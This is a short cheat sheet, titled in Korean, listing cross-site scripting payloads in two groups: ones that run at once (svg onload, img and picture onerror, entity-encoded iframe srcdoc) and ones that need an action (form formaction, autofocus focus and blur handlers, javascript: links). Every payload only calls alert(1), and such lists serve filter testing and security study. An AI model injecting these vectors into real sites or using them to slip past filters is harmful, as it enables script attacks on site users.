# 크로스 사이트 스크립팅 목록

```js
// 1. 즉시 실행

`<svg/onload=alert(1)>`

`<video><source onerror="alert(1)">`

`<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />`

`<picture><source srcset="x"><img onerror="alert(1)"></picture>`

`<picture><img srcset="x" onerror="alert(1)"></picture>`

`<img srcset=",,,,,x" onerror="alert(1)">`


// 2. 액션

`<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>`

`<input onfocus=alert(1) autofocus>`

`<input onblur=alert(1) autofocus><input autofocus>`

`<form><button formaction="javascript:alert(1)">X</button>`

`<iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe>`

`<a href="javascript:&apos;<svg onload&equals;alert&lpar;1&rpar;&nvgt;&apos;">CLICK</a>`
```